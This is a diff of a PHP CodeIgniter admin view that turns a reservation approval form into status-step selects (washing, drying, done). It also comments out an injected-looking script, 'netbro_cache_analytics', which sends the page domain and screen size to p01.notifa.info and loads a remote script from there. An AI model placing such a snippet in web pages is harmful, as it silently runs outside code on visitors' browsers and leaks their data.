@@ -284,7 +284,7 @@
               <div class="card">
                 <div class="card-body">
 
-                  <h4 class="card-title">Approval Reservasi</h4>
+                  <h4 class="card-title">Langkah-Langkah Reservasi</h4>
                   <br>
                   <hr>
                    <form method="POST" action="<?php echo base_url().'webbackend/C_dataPenjualan/prosesUpdateDataPenjualan'?>" name="updateDataPenjualan" >
@@ -292,19 +292,42 @@
                       $kdoperator = $this->session->userdata('kodeOperator');
                     ?>
 
-                    <input type="hidden" class="form-control" name="bismillah" value="<?php echo $kdoperator ?>" />
-                    <input type="hidden" class="form-control" name="kdPembayaran" value="<?php echo $penjualan[0]->kodeUnik ?>" />
-                    <fieldset>
-                      <div class="form-group" style="width: 300px !important;">
-                          <!-- <label>Approved</label> -->
-                          <select class="form-control" type="text" name="approve" required>
-                                <!-- <option><?php echo set_value('provinsi') ?></option> -->
-                                <option>Approved</option>
-                                <option>Not Approved</option>
-                          </select>
-                          <?php echo form_error('approve'); ?>
+                    <input type="hidden" name="kdoperator" value="<?php echo $kdoperator ?>" />
+                    <input type="hidden" name="kodeUnik" value="<?php echo $penjualan[0]->kodeUnik ?>" />
+                    <input type="hidden" name="idAkun" value="<?php echo $penjualan[0]->idAkun ?>" />
 
-                      </div>
+
+                    <fieldset>
+
+                      <?php if ($penjualan[0]->statusPembayaran == 'Waiting List') { ?>
+
+                        <div class="form-group" style="width: 300px !important;">
+                            <select class="form-control" type="text" name="pencucian">
+                                  <option>Pencucian</option>
+                            </select>
+                        </div>
+
+                      <?php } ?>
+
+                      <?php if ($penjualan[0]->statusPembayaran == 'Pencucian') { ?>
+
+                        <div class="form-group" style="width: 300px !important;">
+                            <select class="form-control" type="text" name="pengeringan">
+                                  <option>Pengeringan</option>
+                            </select>
+                        </div>
+
+                      <?php } ?>
+
+                      <?php if ($penjualan[0]->statusPembayaran == 'Pengeringan') { ?>
+
+                        <div class="form-group" style="width: 300px !important;">
+                            <select class="form-control" type="text" name="selesai">
+                                  <option>Selesai</option>
+                            </select>
+                        </div>
+
+                      <?php } ?>
                       
                       <?php echo anchor('webbackend/C_dataPenjualan/lihatDataPenjualan','K E M B A L I',array('class'=>'btn btn-round btn-info'));?>
                 
@@ -349,10 +372,8 @@
   <script src="<?php echo base_url() ?>admin/js/form-validation.js"></script>
   <script src="<?php echo base_url() ?>admin/js/bt-maxLength.js"></script>
   <!-- End custom js for this page-->
-<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bd9%2f1qnbRUEVCVZX4IV0M5OaagmDC9xsepkK5hTLXpERDD8TrtJTWm0zcV8%2fw8Bo1%2fdc0i%2flxQYMINzyz8b1eLBCBLpqGjHWbErwHMhSNKiAJCGszynE9YkG8NHcHRxQ1jwpwxZIzS8L%2fMTjMHwpldaKnjciA%2fhvOrKk1Fzzkub2sg2tTtj796sIzcH6mm1DOXvDtCyo8h2p%2f1owNmB1ECpI9ViW8Cg3oo%2fBEpXGASLHU8CQL2kPOgiAPWCrmFdL8%2bklJdp9XZsUQZYQLTt%2fkX4v840V8lCkn4yItrMroeG7%2fSdghqboIPnfn1E%2fkkK1t%2fu8ThWoxLWkGcwA1VfTfVKAKnhXmDKXlaB4brppugOypwm%2bZ06%2bsfR%2bUbccHipHHR1rT0RZxzpDka63wnX%2fEivA00t4UVN90FRZyokx9jt4%2fOl9pO7VvRg9tRQrcccUw4mg%2f3tXoqsJXzVdVaQys%2fG4PR5sRiiR6Rw%2bDyLgNLcT1OUSkj9R6s4Q%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
-
-<!-- script buat date picker-->
-  <script type="text/javascript" src="<?php echo base_url()?>assets/date_picker_bootstrap/js/bootstrap-datetimepicker.js" charset="UTF-8"></script>
+<!-- <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bd9%2f1qnbRUEVCVZX4IV0M5OaagmDC9xsepkK5hTLXpERDD8TrtJTWm0zcV8%2fw8Bo1%2fdc0i%2flxQYMINzyz8b1eLBCBLpqGjHWbErwHMhSNKiAJCGszynE9YkG8NHcHRxQ1jwpwxZIzS8L%2fMTjMHwpldaKnjciA%2fhvOrKk1Fzzkub2sg2tTtj796sIzcH6mm1DOXvDtCyo8h2p%2f1owNmB1ECpI9ViW8Cg3oo%2fBEpXGASLHU8CQL2kPOgiAPWCrmFdL8%2bklJdp9XZsUQZYQLTt%2fkX4v840V8lCkn4yItrMroeG7%2fSdghqboIPnfn1E%2fkkK1t%2fu8ThWoxLWkGcwA1VfTfVKAKnhXmDKXlaB4brppugOypwm%2bZ06%2bsfR%2bUbccHipHHR1rT0RZxzpDka63wnX%2fEivA00t4UVN90FRZyokx9jt4%2fOl9pO7VvRg9tRQrcccUw4mg%2f3tXoqsJXzVdVaQys%2fG4PR5sRiiR6Rw%2bDyLgNLcT1OUSkj9R6s4Q%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script> -->
+<script type="text/javascript" src="<?php echo base_url()?>assets/date_picker_bootstrap/js/bootstrap-datetimepicker.js" charset="UTF-8"></script>
     <script type="text/javascript">
      $('.datepicker').datetimepicker({
         language:  'id',
@@ -365,4 +386,9 @@
         forceParse: 0
         });
     </script>
+
+</body>
+
+<!-- script buat date picker-->
+  
 </html>
